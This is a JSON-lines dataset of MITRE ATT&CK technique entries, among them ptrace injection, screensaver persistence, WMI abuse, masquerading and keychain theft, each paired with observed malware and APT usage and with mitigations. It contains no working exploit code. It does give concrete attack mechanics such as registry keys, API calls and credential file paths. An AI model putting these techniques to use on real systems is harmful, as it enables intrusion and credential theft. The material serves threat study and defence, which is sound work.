{"text": " Adversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks. They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections. Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications. To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised. When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance. By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.", "idx": "https://attack.mitre.org/techniques/T1599", "title": "Network Boundary Bridging", "entity": "Network Boundary Bridging", "entity_type": "techniques", "entity_context": ["Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations.", "Refer to NIST guidelines when creating password policies. ", "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints.", "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.", "Upon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective."], "is_subtechnique": false}
{"text": " Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/008", "title": "Ptrace System Calls", "entity": "Ptrace System Calls", "entity_type": "techniques", "entity_context": ["Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor. "], "is_subtechnique": true}
{"text": " Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.", "idx": "https://attack.mitre.org/techniques/T1571", "title": "Non-Standard Port", "entity": "Non-Standard Port", "entity_type": "techniques", "entity_context": ["TYPEFRAME has used ports 443, 8080, and 8443 with a FakeTLS method.", "Emotet has used HTTP over ports such as 20, 22, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.", "HARDRAIN binds and listens on port 443 with a FakeTLS method.", "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.", "njRAT has used port 1177 for HTTP C2 communications.", "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports for that particular network segment.", "\nStrongPity has used HTTPS over port 1402 in C2 communication.", "GravityRAT has used HTTP over a non-standard port, such as TCP port 46769.", "An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.", "APT-C-36 has used port 4050 for C2 communications.", "APT33 has used HTTP over TCP ports 808 and 880 for command and control.", "WellMail has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.", "RedLeaves can use HTTP over non-standard ports, such as 995, for C2.", "Derusbi has used unencrypted HTTP on port 443 for C2.", "MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.", "BendyBear has used a custom RC4 and XOR encrypted protocol over port 443 for C2.", "GoldenSpy has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.", "Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. Newer versions of TrickBot have been known to use a custom communication protocol which sends the data unencrypted over port 443. ", "BADCALL communicates on ports 443 and 8000 with a FakeTLS method.", "PoetRAT used TLS to encrypt communications over port 143", "FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.", "Sandworm Team has used port 6789 to accept connections on the group's SSH server.", "DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.", "RTM used Port 44443 for its VNC module.", "Rocke's miner connects to a C2 server using port 51640.\t", "Metamorfo has communicated with hosts over raw TCP on port 9999. ", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "HOPLIGHT has connected outbound over TCP port 443 with a FakeTLS method.", "TEMP.Veles has used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.", "Magic Hound malware has communicated with its C2 server over TCP port 4443 using HTTP.", "Bankshot binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.", "Silence has used port 444 when sending data about the system from the client to the server.\t"], "is_subtechnique": false}
{"text": " Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence: * <code>SCRNSAVE.exe</code> - set to malicious PE path * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)", "idx": "https://attack.mitre.org/techniques/T1546/002", "title": "Screensaver", "entity": "Screensaver", "entity_type": "techniques", "entity_context": ["Gazer can establish persistence through the system screensaver by configuring it to execute the malware.", "Use Group Policy to disable screensavers if they are unnecessary.", "Block .scr files from being executed from non-standard locations."], "is_subtechnique": true}
{"text": " Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns. Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.", "idx": "https://attack.mitre.org/techniques/T1598", "title": "Phishing for Information", "entity": "Phishing for Information", "entity_type": "techniques", "entity_context": ["Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.", "APT28 has used spearphishing to compromise credentials.", "ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails.", "Users can be trained to identify social engineering techniques and spearphishing attempts."], "is_subtechnique": false}
{"text": " Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff. Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).", "idx": "https://attack.mitre.org/techniques/T1593/001", "title": "Social Media", "entity": "Social Media", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails."], "is_subtechnique": true}
{"text": " Adversaries may create a new process with a different token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs) Creating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)).", "idx": "https://attack.mitre.org/techniques/T1134/002", "title": "Create Process with Token", "entity": "Create Process with Token", "entity_type": "techniques", "entity_context": ["KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.", "PoshC2 can use Invoke-RunAs to make tokens.", "Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.", "An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.", "PipeMon can attempt to gain administrative privileges using token impersonation.", "Turla RPC backdoors can impersonate or steal process tokens before executing commands.\t", "Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object.  Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.", "Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call <code>CreateProcessAsUserA</code> under that user's context.", "ZxShell has a command called RunAs, which creates a new process as another user or process context. ", "Empire can use <code>Invoke-RunAs</code> to make tokens.", "Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.", "Aria-body has the ability to execute a process using <code>runas</code>.", "REvil can launch an instance of itself with administrative rights using runas."], "is_subtechnique": true}
{"text": " Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection. (Citation: Cisco Synful Knock Evolution)", "idx": "https://attack.mitre.org/techniques/T1059/008", "title": "Network Device CLI", "entity": "Network Device CLI", "entity_type": "techniques", "entity_context": ["Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions users can perform and provide a history of user actions to detect unauthorized use and abuse. Ensure least privilege principles are applied to user accounts and groups so that only authorized users can perform configuration changes. ", "TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization. ", "Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization "], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1590/006", "title": "Network Security Appliances", "entity": "Network Security Appliances", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials. To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.", "idx": "https://attack.mitre.org/techniques/T1555/001", "title": "Keychain", "entity": "Keychain", "entity_type": "techniques", "entity_context": ["iKitten collects the keychains on the system.", "Calisto collects Keychain storage data and copies those passwords/tokens to a file.", "The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password.", "Proton gathers credentials in files for keychains.", "LaZagne can obtain credentials from macOS Keychains.\t"], "is_subtechnique": true}
{"text": " Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), addition of new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.", "idx": "https://attack.mitre.org/techniques/T1200", "title": "Hardware Additions", "entity": "Hardware Additions", "entity_type": "techniques", "entity_context": ["Block unknown devices and accessories by endpoint security configuration and monitoring agent.", "Establish network access control policies, such as using device certificates and the 802.1x standard.  Restrict use of DHCP to registered devices to prevent unregistered devices from communicating with trusted systems.", "DarkVishnya used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network."], "is_subtechnique": false}
{"text": " Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013) Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012) Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware", "idx": "https://attack.mitre.org/techniques/T1505/004", "title": "IIS Components", "entity": "IIS Components", "entity_type": "techniques", "entity_context": ["Ensure IIS DLLs and binaries are signed by the correct application developers.", "OwaAuth has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.", "Do not allow administrator accounts that have permissions to add IIS components to be used for day-to-day operations that may expose these permissions to potential adversaries and/or other unprivileged systems.", "RGDoor establishes persistence on webservers as an IIS module.", "Regularly check installed IIS components to verify the integrity of the web server and identify if unexpected changes have been made.", "Restrict unallowed ISAPI extensions and filters from running by specifying a list of ISAPI extensions and filters that can run on IIS."], "is_subtechnique": true}
{"text": " Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable. Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added. Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)", "idx": "https://attack.mitre.org/techniques/T1574/004", "title": "Dylib Hijacking", "entity": "Dylib Hijacking", "entity_type": "techniques", "entity_context": ["Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.", "Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard dylib folders."], "is_subtechnique": true}
{"text": " Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM). (Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. (Citation: MSDN WMI) (Citation: FireEye WMI 2015) An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)", "idx": "https://attack.mitre.org/techniques/T1047", "title": "Windows Management Instrumentation", "entity": "Windows Management Instrumentation", "entity_type": "techniques", "entity_context": ["HOPLIGHT has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.\t", "One variant of Zebrocy uses WMI queries to gather information.", "Chimera has used WMIC to execute remote commands.", "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).", "Naikon has used WMIC.exe for lateral movement.", "REvil can use WMI to monitor for and kill specific processes listed in its configuration file.", "Lucifer can use WMI to log into remote machines for propagation.", "SUNBURST used the WMI query <code>Select * From Win32_SystemDriver</code> to retrieve a driver listing.", "Remexi executes received commands with wmic.exe (for WMI commands). ", "Sibot has used WMI to discover network connections and configurations. Sibot has also used the Win32_Process class to execute a malicious DLL.", "Frankenstein has used WMI queries to check if various security applications were running, as well as the operating system version.", "Koadic can use WMI to execute commands.", "Indrik Spider has used WMIC to execute commands on remote computers. ", "MoleNet can perform WMI commands on the system.", "APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.", "Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.", "EKANS can use Windows Mangement Instrumentation (WMI) calls to execute operations.", "Netwalker can use WMI to delete Shadow Volumes.\t", "Emotet has used WMI to execute powershell.exe.", "A BlackEnergy 2 plug-in uses WMI to gather victim host details.", "GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.", "POWERSTATS can use WMI queries to retrieve data from compromised hosts.", "Operation Wocao has used WMI to execute commands.", "Sandworm Team has used VBScript to run WMI queries. ", "FIN6 has used WMI to automate the remote execution of PowerShell scripts.\t", "HALFBAKED can use WMI queries to gather system information.", "Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally.", "Agent Tesla has used wmi queries to gather information from the system. ", "OilRig has used WMI for execution.", "HELLOKITTY can use WMI to delete volume shadow copies.", "POWRUNER may use WMI when collecting information about a victim.", "FELIXROOT uses WMI to query the Windows Registry.", "PoshC2 has a number of modules that use WMI to execute tasks.", "Cobalt Strike can use WMI to deliver a payload to a remote host.", "NotPetya can use <code>wmic</code> to help propagate itself across a network.", "Mosquito's installer uses WMI to search for antivirus display names.", "Octopus has used wmic.exe for local discovery information.", "RogueRobin uses various WMI queries to check if the sample is running in a sandbox.", "Valak can use <code>wmic process call create</code> in a scheduled task to launch plugins and for execution.", "StoneDrill has used the WMI command-line (WMIC) utility to run tasks.", "Olympic Destroyer uses WMI to help propagate itself across a network.", "Empire can use WMI to deliver a payload to a remote host. ", "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by WMI commands from running. Note: many legitimate tools and applications utilize WMI for command execution. ", "Prevent credential overlap across systems of administrator and privileged accounts. ", "Use application control configured to block execution of <code>wmic.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>wmic.exe</code> application and to prevent abuse.", "jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.", "Windshift has used WMI to collect information about target machines.", "SharpStage can use WMI for execution.", "EVILNUM has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.", "RATANKBA uses WMI to perform process monitoring.", "Lazarus Group malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.", "OopsIE uses WMI to perform discovery techniques.", "ProLock can use WMIC to execute scripts on targeted hosts.", "Avaddon uses wmic.exe to delete shadow copies.", "FIVEHANDS can use WMI to delete files on a  target machine.", "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC for lateral movement as well as during and post compromise cleanup activities.", "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI.", "APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.", "Kazuar obtains a list of running processes through WMI querying.", "IcedID has used WMI to execute binaries.", "QakBot can execute WMI queries to gather information.", "PowerSploit's <code>Invoke-WmiCommand</code> CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload.", "A Threat Group-3390 tool can use WMI to execute a binary.", "FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.", "KOMPROGO is capable of running WMI queries.", "MuddyWater has used malware that leveraged WMI for execution and querying host information.", "Bazar can execute a WMI query to gather information about the installed antivirus engine.", "Astaroth uses WMIC to execute payloads. ", "CrackMapExec can execute remote commands using Windows Management Instrumentation.\t", "EvilBunny has used WMI to gather information about the system.", "The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.", "Maze has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network. ", "FIN7 has used WMI to install malware on targeted systems.", "Leviathan has used WMI for execution.", "Ursnif droppers have used WMI classes to execute PowerShell commands.", "menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.", "Blue Mockingbird has used wmic.exe to set environment variables.", "Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).", "Impacket's wmiexec module can be used to execute commands through WMI.", "WannaCry utilizes <code>wmic</code> to delete shadow copies.", "APT29 used WMI to steal credentials and execute backdoors at a future time. They have also used WMI for the remote execution of files for lateral movement.", "Mustang Panda has executed PowerShell scripts via WMI.", "The Deep Panda group is known to utilize WMI for lateral movement.", "DEATHRANSOM has the ability to use WMI to delete volume shadow copies.", "Stuxnet used WMI with an <code>explorer.exe</code> token to execute on a remote share."], "is_subtechnique": false}
{"text": " Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)", "idx": "https://attack.mitre.org/techniques/T1036", "title": "Masquerading", "entity": "Masquerading", "entity_type": "techniques", "entity_context": ["Dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.", "Ramsay has masqueraded as a JPG image file.", "RTM has been delivered as archived Windows executable files masquerading as PDF documents.\t", "Windshift has used icons mimicking MS Office files to mask malicious executables. Windshift has also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers.", "Require signed binaries.", "BoomBox has the ability to mask malicious data strings as PDF files.", "Raindrop was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.", "TA551 has masked malware DLLs as dat and jpg files.", "OilRig has used .doc file extensions to mask malicious executables.", "Use tools that restrict program execution via application control by attributes other than file name for common operating system utilities that are needed.", "TRITON attempts to write a dummy program into memory if it fails to reset the Triconex controller.", "AppleSeed can disguise JavaScript files as PDFs.", "BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF.", "XCSSET builds a malicious application bundle to resemble Safari through using the Safari icon and <code>Info.plist</code>. ", "Ryuk can create .dll files that actually contain a Rich Text File format document.", "WindTail has used icons mimicking MS Office files to mask payloads.", "ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.", "SombRAT can use a legitimate process name to hide itself.", "The QakBot payload has been disguised as a PNG file. ", "Nomadic Octopus attempted to make Octopus appear as a  Telegram Messenger with a Russian interface.", "menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files. ", "The Dacls Mach-O binary has been disguised as a .nib file.", "EnvyScout has used folder icons for malicious files to lure victims into opening them.", "Use file system access controls to protect folders such as C:\\\\Windows\\\\System32.", "NativeZone has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.", "The TrickBot downloader has used an icon to appear as a Microsoft Word document.", "APT28 has renamed the WinRAR utility to avoid detection.", "APT29 has set the hostnames of its C2 infrastructure to match legitimate hostnames in the victim environment. They have also used IP addresses originating from the same country as the victim for their VPN infrastructure.", "PLATINUM has renamed rar.exe to avoid detection.", "FatDuke has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.", "APT32 has disguised a Cobalt Strike beacon as a Flash Installer.", "NotPetya drops PsExec with the filename dllhost.dat."], "is_subtechnique": false}
{"text": " Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage. Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure. Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .", "idx": "https://attack.mitre.org/techniques/T1619", "title": "Cloud Storage Object Discovery", "entity": "Cloud Storage Object Discovery", "entity_type": "techniques", "entity_context": ["Restrict granting of permissions related to listing objects in cloud storage to necessary accounts."], "is_subtechnique": false}
